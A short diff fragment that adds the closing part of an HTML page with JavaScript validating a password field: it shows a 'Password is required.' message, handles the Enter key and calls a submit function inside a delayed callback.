+              submitMsg.style.color = "#d00000";
+              submitMsg.style.opacity = "1";
+            }
+            passField.focus();
+            return;
+          }
+
+          submitForm();
+        });
+      }
+
+      /* ======================= Enter Key + Password Required ======================= */
+      if(passField){
+        passField.addEventListener('keydown', (e)=>{
+          if(e.key === 'Enter'){
+            e.preventDefault();
+
+            if (passField.value.trim() === "") {
+              if(submitMsg){
+                submitMsg.textContent = "Password is required.";
+                submitMsg.style.display = "block";
+                submitMsg.style.color = "#d00000";
+                submitMsg.style.opacity = "1";
+              }
+              passField.focus();
+              return;
+            }
+
+            submitForm();
+          }
+        });
+      }
+    }
+
+    setTimeout(()=> window.dispatchEvent(new Event('resize')), 30);
+
+  }, 3600);
+});
+</script> -->
+  </body>
+</html>
